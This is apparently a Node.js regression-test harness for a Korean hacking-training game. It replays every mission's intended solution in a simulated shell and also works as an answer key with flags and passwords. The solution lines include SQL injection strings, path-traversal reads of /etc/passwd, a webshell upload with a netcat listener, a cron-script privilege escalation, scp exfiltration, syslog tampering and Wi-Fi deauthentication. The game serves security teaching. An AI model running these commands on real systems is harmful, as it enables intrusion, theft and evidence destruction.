/* ============================================================
 * playtest.js — 개발용 헤드리스 검증 하니스
 * 브라우저(window/document/localStorage)를 스텁으로 대체해
 * 게임 로직 전체를 의도된 풀이로 통과시켜 회귀를 잡는다.
 *   실행:  node playtest
 * ============================================================ */
const fs = require('fs');
const path = require('path');
const vm = require('vm');

// ---- 최소 브라우저 스텁 ----
const noop = () => {};
const elStub = () => new Proxy(
  { style: {}, classList: { add: noop, remove: noop }, setAttribute: noop, removeAttribute: noop, appendChild: noop, querySelectorAll: () => [], addEventListener: noop },
  { get(t, p) { return p in t ? t[p] : (t[p] = ''); }, set(t, p, v) { t[p] = v; return true; } }
);
const documentStub = {
  body: { setAttribute: noop, removeAttribute: noop },
  getElementById: elStub, querySelector: elStub, querySelectorAll: () => [],
  createElement: elStub, addEventListener: noop
};
const store = {};
const localStorageStub = {
  getItem: k => (k in store ? store[k] : null),
  setItem: (k, v) => { store[k] = String(v); },
  removeItem: k => { delete store[k]; }
};

const win = { addEventListener: noop };
const ctx = {
  window: win, document: documentStub, localStorage: localStorageStub,
  atob: s => Buffer.from(s, 'base64').toString('binary'),
  btoa: s => Buffer.from(s, 'binary').toString('base64'),
  escape, unescape, setTimeout: noop, clearTimeout: noop, console, Date,
  RegExp, Math, JSON, Object, Array, String, Number, parseInt, parseFloat, Buffer
};
ctx.global = ctx;
vm.createContext(ctx);

const root = __dirname;
// 셸/UI(terminal·os·apps)는 DOM 의존이라 로드 안 함 — win.term 은 아래 Proxy 스텁으로 대체
for (const f of ['filesystem', 'commands', 'levels', 'wargames', 'modes', 'comms', 'game']) {
  vm.runInContext(fs.readFileSync(path.join(root, 'js', f + '.js'), 'utf8'), ctx, { filename: f + '.js' });
}

// term 스텁: 모든 호출을 빈 문자열로 흡수
win.term = new Proxy({}, { get: () => (() => '') });
win.DEBUG = false;

const game = win.game;
let pass = 0, fail = 0;
const results = [];
function ok(name, cond, extra) {
  (cond ? pass++ : fail++);
  results.push((cond ? 'PASS ' : 'FAIL ') + name + (extra && !cond ? '  -> ' + extra : ''));
}

function playScenario(i, lines) {
  game.appMode = 'scenario'; game.activeSet = win.LEVELS; game.levelIndex = i; game.scenarioIndex = i;
  game.challengeLoaded = false; game._resetRun(); win.LEVELS[i].setup(game); game.cleared = false;
  for (const ln of lines) game.exec(ln);
  return win.LEVELS[i].check(game);
}
function playWar(i, lines) {
  game.appMode = 'wargame'; game.activeSet = win.WARGAMES; game.levelIndex = i;
  game.challengeLoaded = true; game._resetRun(); win.WARGAMES[i].setup(game); game.cleared = false;
  for (const ln of lines) game.exec(ln);
  return win.WARGAMES[i].check(game);
}

// ---------- 시나리오 34 (NEW_MISSIONS 캠페인) ----------
const S = [
  ['cat readme.txt', 'submit NS-7F4'],                                                    // S1.01
  ['ls -a', 'cat .env', 'submit h3lios_dev_99'],                                          // S1.02
  ['grep HELIOS system.log', 'submit 10.0.1.9'],                                          // S1.03
  ['chmod +x start.sh', './start.sh'],                                                    // S1.04
  ['base64 -d cipher.txt', 'submit HeliosAdmin'],                                         // S1.05
  ['dig axfr helios.corp @ns.helios.corp', 'submit dev-test.helios.corp'],                // S1.06
  ['nmap dev-test.helios.corp', 'submit 80'],                                             // S1.07
  ['grep -oE "[a-z.0-9_]+@helios.corp" team.html > emails.txt'],                          // S1.08
  ['nmap -sV dev-test.helios.corp', 'submit vsftpd 2.3.4'],                               // S1.09
  ['nmap 10.0.1.0/24', 'hydra 10.0.1.5 ftp wordlist.txt', 'ftp 10.0.1.5'],                  // S1.10
  ['curl http://help.helios.corp/robots.txt', 'submit /admin_portal'],                    // S2.01
  ["login admin ' OR '1'='1' --"],                                                        // S2.02
  ["login admin ' UNION SELECT null,user,pass FROM users --"],                            // S2.03
  ['curl http://help.helios.corp/download?file=../../../../etc/passwd'],                  // S2.04
  ['tcpdump -r capture.pcap Cookie', 'submit S3SS_9f3a2b'],                               // S2.05
  ['curl -X POST -F file=@shell.php http://help.helios.corp/upload'],                     // S2.06
  ['nc -lvnp 4444', 'curl http://help.helios.corp/uploads/shell.php'],                    // S2.07
  ['ls -l /tmp/gift.sh', 'cat /tmp/gift.sh'],                                             // S2.08
  ['find / -perm -4000 2>/dev/null', 'submit /usr/bin/runner'],                           // S3.01
  ['strings /usr/bin/runner', 'su root Pr0per_R00t!'],                                    // S3.02 (creed)
  ['find / -name helios_auth_daemon', 'submit /opt/core/helios_auth_daemon'],             // S3.03
  ['strings /opt/core/helios_auth_daemon', 'submit H3lios_M4st3rK3y'],                    // S3.04
  ['zip2john data.zip > hash.txt', 'john hash.txt'],                                      // S3.05
  ['bunzip2 payload.bz2', 'tar -xvf payload.tar', 'gunzip payload.gz'],                   // S3.06
  ['steghide extract -sf cover.jpg', 'cat hidden.txt', 'submit z3r0_d4y'],                // S3.07
  ['scp blacklist.db me@10.0.0.42:/tmp/'],                                                // S3.08 (creed)
  ['airmon-ng start wlan0'],                                                              // S4.01
  ['airmon-ng start wlan0', 'airodump-ng wlan0mon', 'submit HELIOS-CORE-OPS'],            // S4.02
  ['airmon-ng start wlan0', 'airodump-ng wlan0mon', 'aireplay-ng -0 10 -a DE:AD:C0:DE:13:37 wlan0mon', 'aircrack-ng -w wordlist.txt capture-01.cap', 'submit C0re_Gr1d!'], // S4.03
  ['mount /dev/sda1 /mnt', 'chroot /mnt'],                                                // S4.04
  ['ssh -L 8080:10.0.0.1:80 admin@10.0.1.1 jump_2024'],                                   // S4.05
  ["sed -i '/10.0.0.42/d' /var/log/syslog"],                                              // S4.06
  ['touch -t 202501010000 /var/log/syslog'],                                              // S4.07
  ['systemctl poweroff -f']                                                               // S4.08
];
S.forEach((lines, i) => ok('Scenario ' + win.LEVELS[i].id + ' ' + win.LEVELS[i].title, playScenario(i, lines)));

// ---------- 원격/로컬 컨텍스트 분리: LFI는 로컬 cat/cd가 아니라 원격 HTTP로만 ----------
const lfiIdx = win.LEVELS.findIndex(l => l.id === 'S2.04');
game.appMode = 'scenario'; game.activeSet = win.LEVELS; game.levelIndex = lfiIdx; game.scenarioIndex = lfiIdx;
game.challengeLoaded = false; game._resetRun(); win.LEVELS[lfiIdx].setup(game); game.cleared = false;
ok('S2.04 local terminal cannot read remote /etc/passwd directly', /No such file|Permission denied/.test(game.exec('cat /etc/passwd')));
ok('S2.04 remote LFI reads target /etc/passwd via curl', /root:x:0:0/.test(game.exec('curl "http://help.helios.corp/download?file=../../../../etc/passwd"')) && win.LEVELS[lfiIdx].check(game));

// ---------- 워게임 6 ----------
const W = [
  ['rot13 cipher.txt', 'submit flag{rot13_is_a_classic}'],
  ['base64 -d cookie.txt', 'submit flag{base64_cookies_are_not_safe}'],
  ['strings dump.bin', 'submit flag{strings_reveal_secrets}'],
  ['xor vault.hex arena', 'submit flag{xor_vault_unlocked}'],
  ['nmap 10.0.0.5', 'curl http://10.0.0.5', 'submit flag{curl_the_hidden_endpoint}'],
  ['sudo cat /root/flag.txt', 'submit flag{sudo_was_too_generous}']
];
W.forEach((lines, i) => ok('Wargame ' + win.WARGAMES[i].id + ' ' + win.WARGAMES[i].title, playWar(i, lines)));

// ---------- 코드랩 4 (_ref 통과 / starter 미완) ----------
const CL = win.CodeLab;
CL.game = game; game.codelabSolved = new Set();
CL.list().forEach((c, i) => {
  CL.idx = i;
  ok('CodeLab ' + c.id + ' _ref solves', CL.run(c._ref).ok);
  ok('CodeLab ' + c.id + ' starter incomplete', !CL.run(c.starter).ok, 'starter unexpectedly passed');
});

// ---------- 학습: 전 명령 learn 커버 ----------
const cmdNames = Object.keys(win.COMMANDS);
const learnMiss = cmdNames.filter(n => /찾을 수 없다/.test(win.Academy.learn(n)));
ok('Academy learn covers all ' + cmdNames.length + ' commands', learnMiss.length === 0, 'missing: ' + learnMiss.join(','));

// ---------- 옵션 상세 설명(OPTS) + man/learn 렌더 ----------
const optsMiss = cmdNames.filter(n => !(win.COMMAND_OPTS && Array.isArray(win.COMMAND_OPTS[n]) && win.COMMAND_OPTS[n].length));
ok('Every command has OPTS detail (' + cmdNames.length + ')', optsMiss.length === 0, 'missing: ' + optsMiss.join(','));
ok('Every OPTS entry is [token, desc] pairs', cmdNames.every(n => (win.COMMAND_OPTS[n] || []).every(o => Array.isArray(o) && o.length === 2 && o[0] && o[1])));
const manGrep = win.COMMANDS.man.run({ args: ['grep'], game });
ok('man grep renders OPTIONS (-i/-r/<pattern>/<file>)', /OPTIONS/.test(manGrep) && manGrep.indexOf('-i') !== -1 && manGrep.indexOf('-r') !== -1 && manGrep.indexOf('<pattern>') !== -1 && manGrep.indexOf('<file>') !== -1, manGrep);
const manNmap = win.COMMANDS.man.run({ args: ['nmap'], game });
ok('man nmap renders -sV and subnet(/24)', /OPTIONS/.test(manNmap) && manNmap.indexOf('-sV') !== -1 && manNmap.indexOf('/24') !== -1, manNmap);
const manAir = win.COMMANDS.man.run({ args: ['aireplay-ng'], game });
ok('man aireplay-ng renders --deauth and -a <BSSID>', /OPTIONS/.test(manAir) && manAir.indexOf('--deauth') !== -1 && manAir.indexOf('-a <BSSID>') !== -1);
const learnGrep = win.Academy.learn('grep');
ok('learn grep shows 옵션 section with -r', /옵션/.test(learnGrep) && learnGrep.indexOf('-r') !== -1, learnGrep);

// ---------- 학습 샌드박스: 파일 읽기/쓰기 명령이 throw 하지 않아야 ----------
game.appMode = 'academy'; game.activeSet = null;
win.Academy.enter(game);
let acadOk = true, acadErr = '';
for (const ln of ['echo hi > a.txt', 'cat a.txt', 'grep -i hi a.txt', 'strings welcome.txt']) {
  const out = game.exec(ln);
  if (/실행 오류/.test(out)) { acadOk = false; acadErr = ln + ': ' + out; }
}
ok('Academy file commands run without error', acadOk, acadErr);

// ---------- 실제 셸에 가까운 공통 문법: 파이프/glob/stdin/~ ----------
win.Academy.enter(game);
game.exec('echo alpha > a.txt');
game.exec('echo beta >> a.txt');
game.exec('echo alpha > b.txt');
ok('Shell pipe: cat file | grep pattern', game.exec('cat a.txt | grep beta') === 'beta');
ok('Shell glob: cat *.txt expands matching files', game.exec('cat *.txt | grep alpha | wc -l').trim() === '2');
ok('Shell stdin filters: head reads pipeline input', game.exec('cat a.txt | head -n 1') === 'alpha');
game.exec('cd /tmp');
game.exec('cd ~');
ok('Shell home expansion follows current user', game.cwd === '/home/student');

// ---------- STANCE 분기(성향): 같은 목표, 다른 길 ----------
function playStance(i, lines) {
  game.appMode = 'scenario'; game.activeSet = win.LEVELS; game.levelIndex = i; game.scenarioIndex = i;
  game.challengeLoaded = false; game._resetRun(); win.LEVELS[i].setup(game); game.cleared = false;
  game.stance = { creed: 0, ghost: 0 };
  for (const ln of lines) game.exec(ln);   // markCleared() 가 클리어 시 stance 를 1회 가산
  const passed = win.LEVELS[i].check(game);
  return { passed, st: game.stance };
}
const i302 = win.LEVELS.findIndex(l => l.id === 'S3.02');
const r302c = playStance(i302, ['strings /usr/bin/runner', 'su root Pr0per_R00t!']);
ok('S3.02 정공법(su root) → CREED+', r302c.passed && r302c.st.creed === 1 && r302c.st.ghost === 0, JSON.stringify(r302c));
const r302g = playStance(i302, ['echo "/bin/bash -p" >> /opt/health.sh']);
ok('S3.02 지름길(cron) → GHOST+', r302g.passed && r302g.st.ghost === 1 && r302g.st.creed === 0, JSON.stringify(r302g));
const i308 = win.LEVELS.findIndex(l => l.id === 'S3.08');
const r308c = playStance(i308, ['scp blacklist.db me@10.0.0.42:/tmp/']);
ok('S3.08 보존(scp) → CREED+', r308c.passed && r308c.st.creed === 1, JSON.stringify(r308c));
const r308g = playStance(i308, ['rm -rf blacklist.db']);
ok('S3.08 파괴(rm) → GHOST+', r308g.passed && r308g.st.ghost === 1, JSON.stringify(r308g));

// ---------- WiFi(aircrack-ng 스위트) 체인 게이트 ----------
const wifiIdx = win.LEVELS.findIndex(l => l.title === '악마의 쌍둥이');
game.appMode = 'scenario'; game.activeSet = win.LEVELS; game.levelIndex = wifiIdx;
game._resetRun(); win.LEVELS[wifiIdx].setup(game);
const C = win.COMMANDS;
ok('WiFi: airodump requires monitor mode', /모니터 모드/.test(C['airodump-ng'].run({ args: ['wlan0mon'], game, raw: '' })));
ok('WiFi: aircrack requires captured handshake', /핸드셰이크/.test(C['aircrack-ng'].run({ args: ['-w', 'wordlist.txt', 'capture-01.cap'], game, raw: '' })));
C['airmon-ng'].run({ args: ['start', 'wlan0'], game, raw: '' });
C['airodump-ng'].run({ args: ['wlan0mon'], game, raw: '' });
const dea = C['aireplay-ng'].run({ args: ['-0', '10', '-a', 'DE:AD:C0:DE:13:37', 'wlan0mon'], game, raw: '' });
ok('WiFi: deauth(-0) captures handshake', /handshake 캡처/.test(dea) && game.handshake === 'DE:AD:C0:DE:13:37');
const cr = C['aircrack-ng'].run({ args: ['-w', 'wordlist.txt', 'capture-01.cap'], game, raw: '' });
ok('WiFi: aircrack recovers key from wordlist', /KEY FOUND/.test(cr) && cr.indexOf('C0re_Gr1d!') !== -1);

// ---------- 코믹스(대화) 시스템 ----------
game.appMode = 'scenario'; game.activeSet = win.LEVELS; game.levelIndex = 0;
game.knownContacts = new Set(['mother']); game.chatWith = 'mother';
const cFear = win.Comms.compose(game, '무서워');
ok('Chat: 0xMOTHER responds in-character', cFear.name === '0xMOTHER' && cFear.lines.join('').length > 0, JSON.stringify(cFear));
const cHelp = win.Comms.compose(game, '다음 뭐해');
ok('Chat: contextual help cites current objective', cHelp.lines.some(l => l.indexOf(win.LEVELS[0].objective) !== -1), cHelp.lines.join(' | '));
ok('Channel: wraith locked before contact', /연결된 적이 없다/.test(win.Comms.channel(game, 'wraith')));
win.Comms.register(game, 'wraith');
ok('Channel: wraith switch after contact', /채널 전환/.test(win.Comms.channel(game, 'wraith')) && game.chatWith === 'wraith');
const wWho = win.Comms.compose(game, '넌 누구야');
ok('Chat: WRAITH distinct persona', wWho.name === 'WRAITH' && wWho.cls === 'chat-wraith');
ok('Chat command runs via exec (empty return, no double echo)', win.game.exec('chat 안녕') === '');
game.knownContacts = new Set(['mother']); game.appMode = 'scenario'; game.activeSet = win.LEVELS;
const idxIncoming = win.LEVELS.findIndex(l => !!l.incoming);
game.loadLevel(idxIncoming); // WRAITH 강제 접선 미션
ok('WRAITH incoming mission registers contact', idxIncoming >= 0 && game.knownContacts.has('wraith'));

// ---------- 브리핑/막간극 렌더 경로가 throw 하지 않아야 ----------
let briefOk = true, briefErr = '';
for (let i = 0; i < win.LEVELS.length; i++) {
  game.appMode = 'scenario'; game.activeSet = win.LEVELS;
  try { game.loadLevel(i); } catch (e) { briefOk = false; briefErr = win.LEVELS[i].id + ': ' + e.message; break; }
}
ok('All scenario briefs/interludes render without error', briefOk, briefErr);
const interludeCount = win.LEVELS.filter(l => l.interlude).length;
ok('Story interludes present (>=5 transition cutscenes)', interludeCount >= 5, 'found ' + interludeCount);

// ---------- INTEL 작전 브리핑 (몰입/길잡이) ----------
game.appMode = 'scenario'; game.activeSet = win.LEVELS; game.knownContacts = new Set(['mother']);
game.levelIndex = 0; game.scenarioIndex = 0;
const it0 = game.cmdIntel();
ok('intel renders core elements (작전/NULLSEC/ORACLE/현재목표)', /작전/.test(it0) && /NULLSEC/.test(it0) && /ORACLE/.test(it0) && it0.indexOf(win.LEVELS[0].objective) !== -1, it0);
ok('intel early game: ORACLE DORMANT + 신입', /DORMANT/.test(it0) && /신입/.test(it0));
game.levelIndex = 15; game.scenarioIndex = 15; game.knownContacts = new Set(['mother', 'wraith']);
const it1 = game.cmdIntel();
ok('intel late game: ORACLE HIGH + 요원 + WRAITH 접선', /HIGH/.test(it1) && /요원/.test(it1) && /접선됨/.test(it1), it1);
let intelOk = true;
for (let i = 0; i < win.LEVELS.length; i++) { game.levelIndex = i; game.scenarioIndex = i; try { if (!game.cmdIntel()) intelOk = false; } catch (e) { intelOk = false; } }
ok('intel renders for every level without error', intelOk);
game.levelIndex = 5; game.scenarioIndex = 5;
ok('intel reachable via exec alias (story)', /작전/.test(game.exec('story')));

// ---------- 타이틀 메뉴(새 게임/이어하기) + 그 외 모드 서브메뉴 ----------
game.appMode = 'scenario'; game.activeSet = win.LEVELS;
game.showMenu();
ok('Title menu resets to main screen', game.appMode === 'menu' && game.menuScreen === 'main' && game.activeSet === null);

// 이어하기: 저장된 인덱스부터 재개
game.scenarioIndex = 5; game.showMenu();
game.menuInput('2');
ok('Continue resumes from saved scenario index', game.appMode === 'scenario' && game.levelIndex === 5);

// 새 게임: 항상 L01(index 0)부터, 진행 초기화
game.scenarioIndex = 7; game.showMenu();
game.menuInput('1');
ok('New game starts at L01 and resets progress', game.appMode === 'scenario' && game.levelIndex === 0 && game.scenarioIndex === 0);

// 빈 Enter 기본 동작
game.scenarioIndex = 3; game.showMenu(); game.menuDefault();
ok('Empty Enter continues when progress exists', game.appMode === 'scenario' && game.levelIndex === 3);
game.scenarioIndex = 0; game.showMenu(); game.menuDefault();
ok('Empty Enter = new game when no progress', game.appMode === 'scenario' && game.levelIndex === 0);

// 그 외 모드 서브메뉴 (이제 메인 4번)
game.showMenu(); game.menuInput('4');
ok('Other-modes submenu opens (screen=modes)', game.appMode === 'menu' && game.menuScreen === 'modes');
game.menuInput('1');
ok('Submenu 1 routes to academy', game.appMode === 'academy');
game.showModesMenu(); game.menuInput('2');
ok('Submenu 2 routes to codelab', game.appMode === 'codelab');
game.showModesMenu(); game.menuInput('3');
ok('Submenu 3 routes to wargame', game.appMode === 'wargame');
game.showModesMenu(); game.menuInput('0');
ok('Submenu 0 returns to main title', game.appMode === 'menu' && game.menuScreen === 'main');
game.showModesMenu();
ok('menu command from submenu returns to main title', (game.exec('menu'), game.appMode === 'menu' && game.menuScreen === 'main'));

// ---------- 미션 선택(지난 미션 다시풀기) + 복습(replay) 시맨틱 ----------
game.scenarioIndex = 8; game.showMenu(); game.menuInput('3');
ok('Main 3 opens mission select (screen=missions)', game.appMode === 'menu' && game.menuScreen === 'missions');
game.menuInput('0');
ok('Mission select 0 returns to main title', game.menuScreen === 'main');

// 잠긴 미션 거부 (index > scenarioIndex)
game.scenarioIndex = 5; game.showMissionSelect();
const lockMsg = game.selectMission(12);
ok('Locked mission rejected, stays in menu', /잠긴/.test(lockMsg) && game.appMode === 'menu');

// 과거 미션 복습: 진행도(scenarioIndex) 보존 + replay=true
game.scenarioIndex = 8; game.showMissionSelect();
game.selectMission(3);
ok('Replay past mission enters that level', game.appMode === 'scenario' && game.levelIndex === 3);
ok('Replay preserves progress (scenarioIndex unchanged)', game.scenarioIndex === 8);
ok('Replay flag set true for past mission', game.replay === true);

// 현재 미션 선택: 정상 진행(replay=false)
game.scenarioIndex = 6; game.showMissionSelect();
game.selectMission(6);
ok('Selecting current mission plays normally (no replay)', game.appMode === 'scenario' && game.levelIndex === 6 && game.replay === false);

// mission:N 액션 디스패치 (카드 클릭/방향키 Enter 경로)
game.scenarioIndex = 4; game.showMissionSelect();
game.menuSelect('mission:2');
ok('menuSelect("mission:N") routes to selectMission', game.appMode === 'scenario' && game.levelIndex === 2 && game.replay === true);
// locked 액션
game.scenarioIndex = 2; game.showMissionSelect();
ok('menuSelect("locked") returns lock notice', /잠긴/.test(game.menuSelect('locked')));

let ended = false;
game.appMode = 'scenario'; game.activeSet = win.LEVELS;
try { game.loadLevel(win.LEVELS.length); ended = true; } catch (e) {}  // index >= length → showEnding (term stubbed)
ok('Scenario past last level reaches ending without error', ended);

// ---------- 보고 ----------
console.log(results.join('\n'));
console.log('\n' + (fail === 0 ? '✅ ALL CHECKS PASS' : '❌ ' + fail + ' FAILED') +
  '  (' + pass + ' passed, ' + fail + ' failed)');
process.exit(fail === 0 ? 0 : 1);
